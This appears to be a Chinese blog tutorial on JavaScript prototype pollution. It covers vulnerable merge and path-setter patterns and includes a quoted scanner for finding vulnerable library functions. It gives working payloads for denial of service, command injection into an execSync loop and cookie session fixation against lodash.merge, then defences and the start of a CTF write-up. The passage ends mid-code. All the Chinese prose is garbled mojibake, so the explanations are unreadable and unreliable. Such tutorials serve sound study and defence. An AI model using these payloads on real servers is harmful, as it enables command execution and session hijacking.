class="hljs-number">1</span>console.log(foo.bar)<span class="hljs-regexp">//</span> æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡let zoo = &#123;&#125;<span class="hljs-regexp">//</span> æŸ¥çœ‹zoo.barconsole.log(zoo.bar)</code></pre><p>æœ€ç»ˆzoo.barçš„ç»“æœä¸º2;å› ä¸ºå‰é¢ä¿®æ”¹äº†fooçš„åŸå‹<code>foo.__proto__.bar = 2</code>ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2ã€‚åæ¥ï¼Œåˆç”¨Objectç±»åˆ›å»ºäº†ä¸€ä¸ªzooå¯¹è±¡<code>let zoo = &#123;&#125;</code>ï¼Œzooå¯¹è±¡è‡ªç„¶ä¹Ÿæœ‰ä¸€ä¸ªbarå±æ€§äº†ã€‚åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p><h2 id="åŸå‹é“¾æ±¡æŸ“å®ä¾‹"><a class="header-anchor" href="#åŸå‹é“¾æ±¡æŸ“å®ä¾‹">ğŸ­</a>åŸå‹é“¾æ±¡æŸ“å®ä¾‹</h2><p>åŸå‹é“¾æ±¡æŸ“ä¸€èˆ¬ä¼šå‡ºç°åœ¨å¯¹è±¡ã€æˆ–æ•°ç»„çš„é”®åæˆ–å±æ€§åå¯æ§,è€Œä¸”æ˜¯èµ‹å€¼è¯­å¥çš„æƒ…å†µä¸‹ã€‚</p><h3 id="ä¸€èˆ¬æƒ…å†µ"><a class="header-anchor" href="#ä¸€èˆ¬æƒ…å†µ">ğŸ­</a>ä¸€èˆ¬æƒ…å†µ</h3><pre><code class="hljs js">obj[a][b] = valueobj[a][b][c] = value<span class="hljs-number">12</span></code></pre><p>å¦‚æœæ§åˆ¶äº†a,b,cåŠvalueå°±å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“çš„æ”»å‡»,å¯ä»¥æ§åˆ¶<code>a=__proto__</code></p><h3 id="åˆ©ç”¨æŸäº›APIæ¥è¿›è¡Œæ”»å‡»"><a class="header-anchor" href="#åˆ©ç”¨æŸäº›APIæ¥è¿›è¡Œæ”»å‡»">ğŸ­</a>åˆ©ç”¨æŸäº›APIæ¥è¿›è¡Œæ”»å‡»</h3><h4 id="å…¸å‹mergeæ“ä½œ"><a class="header-anchor" href="#å…¸å‹mergeæ“ä½œ">ğŸ­</a>å…¸å‹mergeæ“ä½œ</h4><ul><li>å¯¹è±¡merge</li><li>å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</li></ul><p>ä»¥å¯¹è±¡mergeä¸ºä¾‹ï¼š</p><pre><code class="hljs sql">function <span class="hljs-keyword">merge</span>(target, <span class="hljs-keyword">source</span>) &#123;    <span class="hljs-keyword">for</span> (let <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">source</span>) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">source</span> &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target) &#123;            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], <span class="hljs-keyword">source</span>[<span class="hljs-keyword">key</span>])        &#125; <span class="hljs-keyword">else</span> &#123;            target[<span class="hljs-keyword">key</span>] = <span class="hljs-keyword">source</span>[<span class="hljs-keyword">key</span>]        &#125;    &#125;&#125;</code></pre><p>åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨èµ‹å€¼çš„æ“ä½œ<code>target[key] = source[key]</code>ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªkeyå¦‚æœæ˜¯<code>__proto__</code>ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥åŸå‹é“¾æ±¡æŸ“å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¯¹æ¯”ä¸€ä¸‹ä¸‹é¢ä¸¤ä¸ªdemoï¼š</p><p>demo1ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = &#123;a: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;b: <span class="hljs-number">2</span>&#125;&#125;<span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<span class="hljs-attribute">o3</span> = &#123;&#125;<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)</code></pre><p>demo2:</p><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125;<span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;)<span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>)<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b)<span class="hljs-attribute">o3</span> = &#123;&#125;<span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)</code></pre><p>demo1ä¸­åŸå‹é“¾ä¸ä¼šè¢«æ±¡æŸ“ï¼Œå› ä¸ºï¼Œæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆ<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>ï¼‰ä¸­ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œæˆ‘ä»¬æ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p><p>è€Œdemo2åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†o2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ï¼Œæ•…Objectå·²ç»è¢«æ±¡æŸ“ã€‚</p><h4 id="Property-definition-by-path"><a class="header-anchor" href="#Property-definition-by-path">ğŸ­</a>Property definition by path</h4><pre><code class="hljs reasonml">the<span class="hljs-constructor">Function(<span class="hljs-params">object</span>, <span class="hljs-params">path</span>, <span class="hljs-params">value</span>)</span></code></pre><p>å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶path,å¦‚path=<strong>proto</strong>.myValue.å°±å¯ä»¥è¿›è¡Œæ±¡æŸ“</p><h4 id="Object-clone"><a class="header-anchor" href="#Object-clone">ğŸ­</a>Object clone</h4><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(obj) &#123;<span class="hljs-keyword">return</span> <span class="hljs-type">merge(&#123;&#125;,</span> obj);&#125;</code></pre><h3 id="æ‰¾å‡ºæ˜“å—æ”»å‡»çš„API"><a class="header-anchor" href="#æ‰¾å‡ºæ˜“å—æ”»å‡»çš„API">ğŸ­</a>æ‰¾å‡ºæ˜“å—æ”»å‡»çš„API</h3><p>node xx.js library-name</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;process&#x27;</span>);<span class="hljs-comment">//checkæ˜¯å¦æ”¶åˆ°æ±¡æŸ“</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">if</span> (&#123;&#125;.test == <span class="hljs-string">&quot;123&quot;</span> || &#123;&#125;.test == <span class="hljs-number">123</span>) &#123;<span class="hljs-keyword">delete</span> <span class="hljs-built_in">Object</span>.prototype.test;<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params">fnct, sig, name, totest</span>) </span>&#123;<span class="hljs-comment">// Reinitialize to avoid issue if the previous function changed attributes.</span>BAD_JSON = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;test&quot;:123&#125;&#125;&#x27;</span>);<span class="hljs-keyword">try</span> &#123;fnct(totest);&#125; <span class="hljs-keyword">catch</span> (e) &#123;&#125;<span class="hljs-keyword">if</span> (check()) &#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Detected : &quot;</span> + name + <span class="hljs-string">&quot; (&quot;</span> + sig + <span class="hljs-string">&quot;)&quot;</span>);&#125;&#125;<span class="hljs-keyword">var</span> BAD_JSON = &#123;&#125;;<span class="hljs-comment">//NULL OBJ</span><span class="hljs-keyword">var</span> args = process.argv.slice(<span class="hljs-number">2</span>);<span class="hljs-comment">//node xx.js param1 param2 parma3è·å–æ‰€æœ‰å‚æ•° è¿”å›æ•°ç»„[param1,param2,param3]</span><span class="hljs-comment">//å¿½ç•¥å¼‚å¸¸</span>process.on(<span class="hljs-string">&#x27;uncaughtException&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) </span>&#123; &#125;);<span class="hljs-keyword">var</span> pattern = [&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(BAD_JSON, &#123;&#125;);&#125;,sig: <span class="hljs-string">&quot;function (BAD_JSON, &#123;&#125;)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(BAD_JSON, BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (BAD_JSON, BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, &#123;&#125;, BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, &#123;&#125;, BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, &#123;&#125;, &#123;&#125;, BAD_JSON)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, <span class="hljs-string">&quot;__proto__.test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_PATH, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, <span class="hljs-string">&quot;__proto__[test]&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_PATH, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(<span class="hljs-string">&quot;__proto__.test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (BAD_PATH, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(<span class="hljs-string">&quot;__proto__[test]&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (BAD_PATH, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(&#123;&#125;, <span class="hljs-string">&quot;__proto__&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (&#123;&#125;, BAD_STRING, BAD_STRING, VALUE)&quot;</span>&#125;,&#123;fnct : <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">totest</span>) </span>&#123;totest(<span class="hljs-string">&quot;__proto__&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);&#125;,sig: <span class="hljs-string">&quot;function (BAD_STRING, BAD_STRING, VALUE)&quot;</span>&#125;]<span class="hljs-keyword">if</span> (args.length &lt; <span class="hljs-number">1</span>) &#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;First argument must be the library name&quot;</span>);exit();&#125;<span class="hljs-keyword">try</span> &#123;<span class="hljs-keyword">var</span> lib = <span class="hljs-built_in">require</span>(args[<span class="hljs-number">0</span>]);&#125; <span class="hljs-keyword">catch</span> (e) &#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Missing library : &quot;</span> + args[<span class="hljs-number">0</span>] );exit();&#125;<span class="hljs-keyword">var</span> parsedObject = [];<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploreLib</span>(<span class="hljs-params">lib, prefix, depth</span>) </span>&#123;<span class="hljs-keyword">if</span> (depth == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span> (parsedObject.indexOf(lib) !== <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>;parsedObject.push(lib);<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k <span class="hljs-keyword">in</span> lib) &#123;<span class="hljs-keyword">if</span> (k == <span class="hljs-string">&quot;abort&quot;</span>) <span class="hljs-keyword">continue</span>;<span class="hljs-keyword">if</span> (k == <span class="hljs-string">&quot;__proto__&quot;</span>) <span class="hljs-keyword">continue</span>;<span class="hljs-keyword">if</span> (+k == k) <span class="hljs-keyword">continue</span>;<span class="hljs-built_in">console</span>.log(k);<span class="hljs-keyword">if</span> (lib.hasOwnProperty(k)) &#123;<span class="hljs-keyword">for</span> (p <span class="hljs-keyword">in</span> pattern) &#123;<span class="hljs-keyword">if</span> (pattern.hasOwnProperty(p)) &#123;run(pattern[p].fnct, pattern[p].sig, prefix + <span class="hljs-string">&quot;.&quot;</span> + k, lib[k]);&#125;&#125;exploreLib(lib[k], prefix + <span class="hljs-string">&quot;.&quot;</span> + k, depth - <span class="hljs-number">1</span>);&#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> lib == <span class="hljs-string">&quot;function&quot;</span>) &#123;<span class="hljs-keyword">for</span> (p <span class="hljs-keyword">in</span> pattern) &#123;<span class="hljs-keyword">if</span> (pattern.hasOwnProperty(p)) &#123;run(pattern[p].fnct, pattern[p].sig, args[<span class="hljs-number">0</span>], lib);&#125;&#125;&#125;&#125;exploreLib(lib, args[<span class="hljs-number">0</span>], <span class="hljs-number">5</span>);</code></pre><p>æ‘˜è‡ªï¼š<a href="https://github.com/HoLyVieR/prototype-pollution-nsec18">https://github.com/HoLyVieR/prototype-pollution-nsec18</a></p><h2 id="åˆ©ç”¨"><a class="header-anchor" href="#åˆ©ç”¨">ğŸ­</a>åˆ©ç”¨</h2><h4 id="æ‹’ç»æœåŠ¡"><a class="header-anchor" href="#æ‹’ç»æœåŠ¡">ğŸ­</a>æ‹’ç»æœåŠ¡</h4><p>JSä¸­çš„Objecté»˜è®¤å¸¦äº†ä¸€äº›å±æ€§,å¦‚toStringå’ŒvalueOf,åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“ä»–ä»¬,å¯èƒ½å¯¼è‡´æ•´ä¸ªç¨‹åºåœæ­¢è¿è¡Œ</p><pre><code>toString()å°†Objectè½¬æ¢ä¸ºå­—ç¬¦ä¸²æ ¼å¼è¿”å›,valueOf()è¿”å›æ•°å€¼æˆ–è€…boolå€¼ç­‰</code></pre><p>{}<strong>proto</strong>.toString=â€œ123â€</p><p>{}<strong>proto</strong>.valueOf=â€œ123â€</p><p>server.js</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">var</span> app = express();<span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);app.use(bodyParser.json(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;application/*+json&#x27;</span> &#125;))app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;res.send(<span class="hljs-string">&quot;Use the POST method !&quot;</span>);&#125;);app.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;_.merge(&#123;&#125;, req.body);res.send(req.body);&#125;);app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Example app listening on port 3000!&#x27;</span>)&#125;);</code></pre><p>payload:</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;toString&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-attr">&quot;valueOf&quot;</span>:<span class="hljs-string">&quot;It works !&quot;</span>&#125;&#125;</code></pre><h4 id="forå¾ªç¯æ±¡æŸ“"><a class="header-anchor" href="#forå¾ªç¯æ±¡æŸ“">ğŸ­</a>forå¾ªç¯æ±¡æŸ“</h4><p>å°±åƒä¸‹é¢çš„forå¾ªç¯,å¦‚æœcommandsé‡Œé¢æœ‰,å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ,æ±¡æŸ“ç­‰</p><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> execSync = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">runJobs</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">var</span> commands = &#123;<span class="hljs-string">&quot;script-1&quot;</span> : <span class="hljs-string">&quot;/bin/bash /opt/my-script-1.sh&quot;</span>,<span class="hljs-string">&quot;script-2&quot;</span> : <span class="hljs-string">&quot;/bin/bash /opt/my-script-2.sh&quot;</span>&#125;;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> scriptname <span class="hljs-keyword">in</span> commands) &#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Executing &quot;</span> + scriptname);execSync(commands[scriptname]);&#125;&#125;</code></pre><p>payloadï¼š</p><pre><code class="hljs jboss-cli">&#123;    â€œ__proto__â€:&#123;â€œmy malicious <span class="hljs-keyword">command</span>â€:â€<span class="hljs-keyword">echo</span> yay &gt; <span class="hljs-string">/tmp/evil</span>â€&#125;&#125;</code></pre><h4 id="å±æ€§æ³¨å…¥"><a class="header-anchor" href="#å±æ€§æ³¨å…¥">ğŸ­</a>å±æ€§æ³¨å…¥</h4><p>æ³¨æ„åˆ°,å¦‚æœæ±¡æŸ“äº†æŸä¸ªç±»çš„prototype,é‚£ä¹ˆé‚£äº›æ²¡æœ‰è¢«æ˜¾å¼å®šä¹‰çš„å¯¹è±¡éƒ½ä¼šå—åˆ°å½±å“.</p><p>NodeJS çš„ httpæ¨¡å—æ”¯æŒå¾ˆå¤šheaderåŒä¸€ä¸ªname.</p><p>æ‰€ä»¥å¦‚æœæ±¡æŸ“äº†å¦‚cookieç­‰.ä¼šé€ æˆå¾ˆæœ‰æ„æ€çš„æ”»å‡».å¯èƒ½å¯¼è‡´æ‰€æœ‰ç”¨æˆ·å…¬ç”¨ä¸€ä¸ªsession</p><pre><code class="hljs routeros">&#123;â€œ__proto__â€:&#123;â€œcookieâ€:â€<span class="hljs-attribute">sess</span>=fixedsessionid; <span class="hljs-attribute">garbage</span>=â€&#125;&#125;</code></pre><h2 id="é˜²å¾¡"><a class="header-anchor" href="#é˜²å¾¡">ğŸ­</a>é˜²å¾¡</h2><h4 id="åŸå‹å†»ç»“"><a class="header-anchor" href="#åŸå‹å†»ç»“">ğŸ­</a>åŸå‹å†»ç»“</h4><p>ECMAScript5æ ‡å‡†ä¸­æ·»åŠ çš„ä¸€ä¸ªç‰¹æ€§.ä½¿ç”¨è¯¥ç‰¹æ€§å,å¯¹äºå¯¹è±¡å±æ€§çš„ä¿®æ”¹éƒ½å°†å¤±è´¥</p><p>eg:Object.freeze() å†»ç»“å¯¹è±¡, å†»ç»“çš„å¯¹è±¡æ— æ³•å†æ›´æ”¹.æˆ‘ä»¬æ— æ³•æ·»åŠ ï¼Œç¼–è¾‘æˆ–åˆ é™¤å…¶ä¸­çš„å±æ€§</p><pre><code class="hljs pgsql"><span class="hljs-keyword">Object</span>.<span class="hljs-keyword">freeze</span>(<span class="hljs-keyword">Object</span>.prototype);<span class="hljs-keyword">Object</span>.<span class="hljs-keyword">freeze</span>(<span class="hljs-keyword">Object</span>);(&#123;&#125;).__proto__.test = <span class="hljs-number">123</span>(&#123;&#125;).test // this will be undefined</code></pre><h4 id="Schema-validation-of-JSON-input"><a class="header-anchor" href="#Schema-validation-of-JSON-input">ğŸ­</a>Schema validation of JSON input</h4><p>NPMä¸Šçš„å¤šä¸ªåº“(ä¾‹å¦‚:avj)éƒ½ä¸ºJSONæ•°æ®æä¾›äº†æ¨¡å¼éªŒè¯,å¯ä»¥åœ¨jsonè§„åˆ™é‡Œæ·»åŠ additionalProperties=false</p><h4 id="ä½¿ç”¨MAPä»£æ›¿Object"><a class="header-anchor" href="#ä½¿ç”¨MAPä»£æ›¿Object">ğŸ­</a>ä½¿ç”¨MAPä»£æ›¿Object</h4><p>MAPæ˜¯EcmaScript 6æ ‡å‡†ä¸­æ–°å¢çš„,éœ€è¦ä½¿ç”¨key/valueæ¨¡å¼æ—¶,å°½é‡ç”¨MAP</p><pre><code class="hljs maxima"><span class="hljs-number">1.</span>jsåˆ›å»º<span class="hljs-built_in">map</span>å¯¹è±¡<span class="hljs-built_in">var</span> <span class="hljs-built_in">map</span> = <span class="hljs-built_in">new</span> Map();<span class="hljs-number">2</span>.å°†é”®å€¼å¯¹æ”¾å…¥<span class="hljs-built_in">map</span>å¯¹è±¡<span class="hljs-built_in">map</span>.set(<span class="hljs-string">&quot;key&quot;</span>,value)<span class="hljs-built_in">map</span>.set(<span class="hljs-string">&quot;key1&quot;</span>,value1)<span class="hljs-built_in">map</span>.set(<span class="hljs-string">&quot;key2&quot;</span>,value2)<span class="hljs-number">3</span>.æ ¹æ®<span class="hljs-built_in">key</span>è·å–<span class="hljs-built_in">map</span>å€¼<span class="hljs-built_in">map</span>.<span class="hljs-built_in">get</span>(<span class="hljs-built_in">key</span>)<span class="hljs-number">4</span>.åˆ é™¤<span class="hljs-built_in">map</span>æŒ‡å®šå¯¹è±¡<span class="hljs-built_in">delete</span> <span class="hljs-built_in">map</span>[<span class="hljs-built_in">key</span>]æˆ–<span class="hljs-built_in">map</span>.<span class="hljs-built_in">delete</span>(<span class="hljs-built_in">key</span>)<span class="hljs-number">5</span>.å¾ªç¯éå†<span class="hljs-built_in">map</span><span class="hljs-built_in">map</span>.forEach(function(<span class="hljs-built_in">key</span>)&#123;ã€€ã€€console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-built_in">key</span>)  //è¾“å‡ºçš„æ˜¯<span class="hljs-built_in">map</span>ä¸­çš„valueå€¼&#125;)</code></pre><h4 id="Object-create-null"><a class="header-anchor" href="#Object-create-null">ğŸ­</a>Object.create(null)</h4><p>å¯ä»¥ç”¨JavaScriptåˆ›å»ºæ²¡æœ‰ä»»ä½•åŸå‹çš„å¯¹è±¡ : Object.create(null),ç”¨Object.creatåˆ›å»ºçš„å¯¹è±¡æ²¡æœ‰__proto__å’Œconstructor ä»¥è¿™ç§æ–¹å¼åˆ›å»ºå¯¹è±¡å¯ä»¥å¸®åŠ©å‡è½»åŸå‹æ±¡æŸ“æ”»å‡»</p><pre><code class="hljs dart"><span class="hljs-keyword">var</span> obj = <span class="hljs-built_in">Object</span>.create(<span class="hljs-keyword">null</span>);obj.__proto__ <span class="hljs-comment">// undefined</span>obj.constructor <span class="hljs-comment">// undefined</span></code></pre><h2 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">ğŸ­</a>ä¾‹é¢˜</h2><h3 id="Code-Breaking-2018-Thejs"><a class="header-anchor" href="#Code-Breaking-2018-Thejs">ğŸ­</a>Code-Breaking 2018 Thejs</h3><p>æºç ï¼š</p><p><img src="/2021/04/18/js/2.png" alt="2"></p><p>lodashæ˜¯ä¸ºäº†å¼¥è¡¥JavaScriptåŸç”Ÿå‡½æ•°åŠŸèƒ½ä¸è¶³è€Œæä¾›çš„ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡ç­‰æ“ä½œã€‚è¿™ä¸ªWebåº”ç”¨ä¸­ï¼Œä½¿ç”¨äº†lodashæä¾›çš„ä¸¤ä¸ªå·¥å…·ï¼š</p><ul><li><code>lodash.template</code> ä¸€ä¸ªç®€å•çš„æ¨¡æ¿å¼•æ“</li><li><code>lodash.merge</code> å‡½æ•°æˆ–å¯¹è±¡çš„åˆå¹¶</li></ul><p>åº”ç”¨é€»è¾‘ï¼šç”¨æˆ·æäº¤çš„ä¿¡æ¯ï¼Œç”¨mergeæ–¹æ³•åˆå¹¶åˆ°sessioné‡Œï¼Œå¤šæ¬¡æäº¤ï¼Œsessioné‡Œæœ€ç»ˆä¿å­˜æäº¤çš„æ‰€æœ‰ä¿¡æ¯ã€‚è¿™é‡Œçš„<code>lodash.merge</code>æ“ä½œå°±å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚</p><p>åœ¨æ±¡æŸ“åŸå‹é“¾åï¼Œæˆ‘ä»¬ç›¸å½“äºå¯ä»¥ç»™Objectå¯¹è±¡æ’å…¥ä»»æ„å±æ€§ï¼Œè¿™ä¸ªæ’å…¥çš„å±æ€§ååº”åœ¨æœ€åçš„<code>lodash.template</code>ä¸­ã€‚<code>lodash.template</code>çš„ä»£ç ï¼š<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><pre><code class="hljs php"><span class="hljs-comment">// Use a sourceURL for easier debugging.</span><span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">&#x27;sourceURL&#x27;</span> in options ? <span class="hljs-string">&#x27;//# sourceURL=&#x27;</span> + options.sourceURL + <span class="hljs-string">&#x27;\n&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">// ...</span><span class="hljs-keyword">var</span> result = attempt(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">Function</span>(<span class="hljs-params">importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source</span>)</span><span class="hljs-function">  .<span class="hljs-title">apply</span>(<span 